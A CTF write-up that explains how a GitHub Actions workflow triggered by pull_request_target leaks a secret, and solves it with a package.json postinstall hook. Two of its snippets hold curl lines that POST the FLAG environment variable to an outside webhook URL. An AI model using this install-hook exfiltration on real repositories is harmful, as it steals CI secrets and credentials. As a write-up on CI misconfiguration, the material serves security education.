---
title: "opensource"
date: 2025-04-06
layout: writeup
platform: squ1rrelCTF 2025
categories: [Cloud]
tags: [Github, Git]
difficulty: Medium
---

# opensource

## Challenge Description

We're given read access to a private repository on Github.

<img src="{{ '/assets/images/opensource/github.png' | relative_url }}" alt="opensource" class="img-fluid" />

It's a simple react application.

## Github workflow

I noticed that there is a `.github/workflows` directory in the repository.

```yaml
name: Test Build

on:
  pull_request_target:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          ref: ${{github.event.pull_request.head.ref}}
          repository: ${{github.event.pull_request.head.repo.full_name}}
          token: ${{ secrets.PAT }}
      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: "20"
      - name: Install dependencies
        run: npm install
        env:
          FLAG: ${{ secrets.FLAG }}
      - name: Run build
        run: npm run build
```

Which means that for every pull request to the repository, the workflow will run with the original repo configuration as base and the changed code.

## Solution

There is a `FLAG` environment variable that is set while installing the dependencies.
We can create a webhook, and we need to somehow get the `FLAG` variable to be sent to the webhook when the workflow is triggered.

My initial attempt was to modify the `package.json` and change the build script with that:

```json
{
  "scripts": {
    "build": "curl -X POST -d $FLAG https://webhook.site/webhook-url"
  }
}
```

But that just sent an empty string to the webhook.
The `FLAG` variable is set in the environment when the `npm install` command is run, but it is not available in the `build` script.

I found out that there is a `postinstall` script that runs after the dependencies are installed, so I modified the `package.json` to include a `postinstall` script that sends the `FLAG` variable to the webhook:

```json
{
  "scripts": {
    "postinstall": "curl -X POST -d $FLAG https://webhook.site/webhook-url"
  }
}
```

`squ1rrel{github_configuration_womp_womp}`
